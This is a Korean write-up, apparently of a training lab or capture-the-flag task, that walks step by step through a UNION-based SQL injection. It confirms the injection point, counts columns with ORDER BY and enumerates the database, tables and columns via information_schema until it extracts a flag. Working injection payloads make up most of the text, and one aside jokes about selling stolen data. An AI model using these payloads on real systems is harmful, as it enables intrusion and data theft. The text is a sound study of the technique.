# UNION SQLi
SQL 질의문 결과가 화면에 보이는 곳   
ex) 게시판, 회원정보(마이페이지), 주소검색, 검색페이지 ... 등등등

## 1. 추리
음 overwatch 검색하니까 name, score, production 3개 정보가 나오네   
db조회해서 하는 거겠지? 그럼 select 문 사용할 거고   
select ??? from ??? where ???   


watch 검색해도 같은 정보 나오네? 그러면 like 썻겠네   
where name like = ''   
% 를 앞하고 뒤 중에서 어디에 썻을까   

verwatc 검색해도 같은 정보가 나오네? 그러면    
where name like ='%__%' 이런 식이겠네   


ㅇㅋ 그럼 대충 정리하면   
select ??? from ??? where name like = '%___%'    
이게 query 겠네    

## 2. 취약점 확인
자 그럼 취약점을 확인해보자   
일단 내가 예상한 쿼리문에 뭔가 넣어서 SQLi 해야 하니까?   
%% 를 이용해서 간단하게 해보자   
verwatc%' #   
똑같은 정보 나오네? 그럼 SQLi 되겠다    

verwatc%' and '1%'='1    
입력해보니까 똑같은 정보 나오네?    
그럼 더 확실하게 된다는 거고   

verwatc%' and '1%'='2   
넣어보니까 안나오네 ㅇㅋ  
and '1%'='1    
이게 성공했다는 소리네   
취약점 확인

## 3. order by
내가 이 사이트를 SQLi 하는 이유가 뭘까?    
데이터 추출?    
서버 다운시키기?    
admin 계정 얻기?  
데이터 추출해서 팔아먹어야지. 이거 팔면 돈 많이 나오겠다.   
ㅇㅋ 그럼 데이터 뽑아먹자   
그럴려면 union으로 내가 원하는 데이터가 나오게 해야겠지?   
근데 union 쓰려면 컬럼 개수부터 알아야지   
컬럼 개수 알기 가장 쉬운 방법은?   
order by.

select ??? from ??? where name like = '%___%'   
여기서 order by 쓰려면 앞에 있는 구문을 먼저 끝내야겠지?   
그럼 verwatch%' 로 먼저 끝내고 컬럼 개수 뽑아 쓰자   
verwatch%' order by 1 #    
입력해보면?   
오 정보 나온다. 컬럼 개수가 1개 이상이라는 뜻이네   
그럼 계속 숫자 늘려가면서 몇개인지 유추 해보자   
1 되고    
2 되고   
3 되고   
4 되고   
5 오류떳다   
그럼 컬럼 개수 4개 확인. ㅇㅋ   

## 4. data 출력 위치 파악
이제 컬럼 개수 확인했으니까 컬럼 위치 확인해야지.   
처음에 있는 name 이 1번이라는 보장은 없잖아?   
1번이라고 해도 1,2,3 이런 식으로 이어질 거라는 보장도 없고.   
어? 근데 컬럼 4개라고 했는데 보여지는 정보 3개네.   
그럼 뭔가 보여지는 컬럼이 아니라는 뜻이네.   
일단 보여지는 컬럼부터 찾아보자   
이제 그럼 union 써서 1,2,3,4 집어넣어보자 컬럼 개수도 4개인 거 알았잖아.   
verwatc%' union select '1','2','3','4' #   
select ??? from ??? where name like = '%watch%' union select '1','2','3','4' #   
name 에 2,   
score 에 3,   
production 에 4 출력됐다.   
ㅇㅋ 그럼 보여줄 수 있는 컬럼 위치 확인 완료. 2,3,4   

## 5. DB 이름 확인
그럼 이제 슬슬 정보를 뽑아봐야지.   
정보 뽑으려면 데이터베이스, 테이블, 컬럼 이름이 다 필요하잖아.   
데이터베이스 이름부터 뽑아볼까?   
select database() 하면 바로 나오잖아.   
   
verwatc%' union select database() #    
하니까 안나오네? 아 맞다 union 컬럼 개수 맞춰줘야지.   
보여줄 수 있는 컬럼 위치 확인도 했었지.   
ㅇㅋ 다시   

verwatc%' union select 1,2,database(), 4 #   
오 3번 위치에 db 이름 떳다.      
segfault_sql 이네. 확인.   
   
## 6. table 이름 확인
그럼 db 이름 알았으니까 테이블 이름도 알아야지.   
테이블 이름 아는 방법이 뭐 길게 썻었는데..   
sql 문으로 뭐였지   
select table_name from information_schema.tables where table_schema = 'db이름'   
아 이거구나   
그럼 이거 union 에 붙여볼까   
verwatc%' union select table_name from information_schema.tables where table_schema = 'segfault_sql' #   
아니 오류뜨네..   
왜 오류뜨지 쿼리문에 넣어봐야겠다   

select ??? from ??? where name like = '%verwatc%' union select table_name from information_schema.tables where table_schema = 'segfault_sql' #%'   
아 아무 생각없이 또 붙여넣기만 했네. union은 컬럼 개수 맞추는 게 중요하다고 했잖아. 또 까먹었네.   
컬럼 개수 맞춰보자.    
verwatc%' union select '1',table_name,'3','4' from information_schema.tables where table_schema = 'segfault_sql' #   
와 드디어 떳다.   
table 이름이    
game,    
member,   
secret 3개네   
secret 뭐지? 궁금하네 들어가볼까?   

## 7. column 이름 확인
table 이름 알았으니까 그럼 이제 컬럼 이름 알아내볼까?   
컬럼 이름은 테이블 알아내는 거하고 비슷했지   
select column_name from informarion_schema.columns where table_name='table이름'   
   
ㅇㅋ 그럼 이번엔 union 컬럼 개수 유의해서 다시 작성해보자   
verwatc%' union select '1',column_name,'3','4' from information_schema.columns where table_name='secret' #   
됐다.   
idx,   
secret 이네   
컬럼 이름도 secret 이야?   
머지 궁금하네 데이터 추출해보자

## 8. data 추출
데이터 추출 하려면 이제는 간단하지. 컬럼 이름도 알았으니까.   
verwatc%' union select '1',secret,'3','4' from secret #   
segfault{fllllllllag}   
플래그 숨겨놨네    